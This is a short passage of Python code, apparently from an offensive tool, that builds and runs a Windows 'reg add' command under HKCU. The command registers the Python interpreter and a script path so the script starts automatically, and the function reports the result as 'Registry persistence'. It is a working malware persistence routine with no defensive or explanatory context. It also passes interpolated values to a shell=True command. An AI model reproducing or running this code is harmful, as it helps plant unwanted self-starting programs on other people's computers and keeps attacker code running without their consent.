            cmd = f'reg add HKCU\\{key_path} /v {value_name} /t REG_SZ /d "{sys.executable} {script_path}" /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return f'Registry persistence: {result.stdout or result.stderr}'
